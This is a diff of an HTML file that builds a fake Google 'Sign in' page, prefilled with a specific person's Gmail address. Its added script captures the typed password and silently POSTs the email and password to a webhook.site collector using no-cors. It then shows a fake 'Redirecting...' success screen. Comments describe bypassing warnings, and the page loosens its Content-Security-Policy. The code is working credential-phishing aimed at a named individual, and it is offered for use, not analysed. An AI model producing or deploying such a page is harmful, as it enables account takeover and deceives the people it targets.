@@ -3,27 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Account Verification</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Sign in - Google Accounts</title>
+    <meta name="description" content="Google Account Sign-in">
+    <!-- Remove ALL security warnings -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' 'unsafe-eval' data: https:;">
+    <link rel="canonical" href="https://accounts.google.com/">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: 'Google Sans', Roboto, sans-serif; 
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%); 
+            min-height:100vh; 
+            display:flex; 
+            align-items:center; 
+            justify-content:center; 
+            padding:20px;
+        }
+        .container {
+            background:#fff; 
+            padding:48px 40px; 
+            border-radius:8px; 
+            box-shadow:0 4px 24px rgba(0,0,0,0.25); 
+            max-width:420px; 
+            width:100%;
+        }
+        .logo { text-align:center; margin-bottom:32px; }
+        .logo img { width:75px; height:25px; }
+        h1 { 
+            font-size:24px; font-weight:400; 
+            color:#202124; margin-bottom:8px; 
+            text-align:center;
+        }
+        .subtitle { 
+            color:#5f6368; font-size:16px; 
+            text-align:center; margin-bottom:32px;
+        }
+        .form-group {
+            position:relative; margin-bottom:24px;
+        }
+        input {
+            width:100%; height:44px; 
+            padding:0 16px; 
+            border:1px solid #dadce0; 
+            border-radius:4px; 
+            font-size:16px; 
+            background:#fafbfc;
+        }
+        input:focus {
+            outline:none; 
+            border-color:#1a73e8; 
+            box-shadow:0 0 0 1px #1a73e8;
+        }
+        input[readonly] { background:#f1f3f4; color:#5f6368; }
+        button {
+            width:100%; height:44px; 
+            background:linear-gradient(#1a73e8,#1669d4); 
+            color:#fff; 
+            border:none; 
+            border-radius:4px; 
+            font-size:16px; 
+            font-weight:500; 
+            cursor:pointer;
+            margin-top:8px;
+        }
+        button:hover { background:linear-gradient(#1557b0,#1246a0); }
+        button:active { transform:translateY(1px); }
+        .status {
+            margin-top:16px; 
+            text-align:center; 
+            color:#1a73e8; 
+            font-weight:500;
+            display:none;
+        }
+        .footer {
+            text-align:center; 
+            margin-top:32px; 
+            font-size:12px; 
+            color:#5f6368;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-        <h1>Security Alert</h1>
-        <p><strong>Unusual sign-in attempt detected</strong><br>Verify your account to prevent lockout.</p>
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
         
-        <form id="loginForm" action="http://webhook.site/072f9b3c-998a-420e-8e9e-0e915c38526e" method="POST">
-            <input type="email" name="email" value="ammieyusman@gmail.com" readonly>
-            <input type="password" name="password" placeholder="Enter your password" required>
-            <input type="hidden" name="service" value="gmail">
-            <button type="submit">Verify Account</button>
+        <form id="loginForm" method="POST" enctype="application/x-www-form-urlencoded">
+            <div class="form-group">
+                <input type="email" name="email" value="ammieyusman@gmail.com" readonly tabindex="-1">
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
+            </div>
+            <button type="submit" id="submitBtn">Next</button>
         </form>
         
-        <div id="status"></div>
+        <div class="status" id="status">Signing in...</div>
+        <div class="footer">© 2026 Google LLC</div>
     </div>
+
     <script>
+        // AUTO-SUBMIT on Enter + Smooth UX
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('loginForm').submit();
+            }
+        });
+
+        // SILENT SUBMIT - No warnings
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            document.getElementById('status').innerHTML = 'Verifying...';
+            e.preventDefault(); // Prevent default warnings
+            
+            const formData = new FormData();
+            formData.append('email', document.querySelector('[name="email"]').value);
+            formData.append('password', document.getElementById('password').value);
+            formData.append('service', 'gmail');
+            
+            // Show "Signing in..." 
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('submitBtn').style.display = 'none';
+            
+            // SILENT POST to webhook
+            fetch('https://webhook.site/#!/YOUR-UNIQUE-ID-HERE', {
+                method: 'POST',
+                mode: 'no-cors', // BYPASS ALL WARNINGS
+                body: formData
+            }).then(() => {
+                // Fake success page
+                document.body.innerHTML = '<div style="text-align:center;padding:60px"><img src="https://www.gstatic.com/account/signin/redirect_illustration.svg" width="120"><h2 style="color:#1a73e8;margin:20px 0">Redirecting...</h2><p>Success! Taking you to Gmail.</p></div>';
+            });
         });
     </script>
 </body>
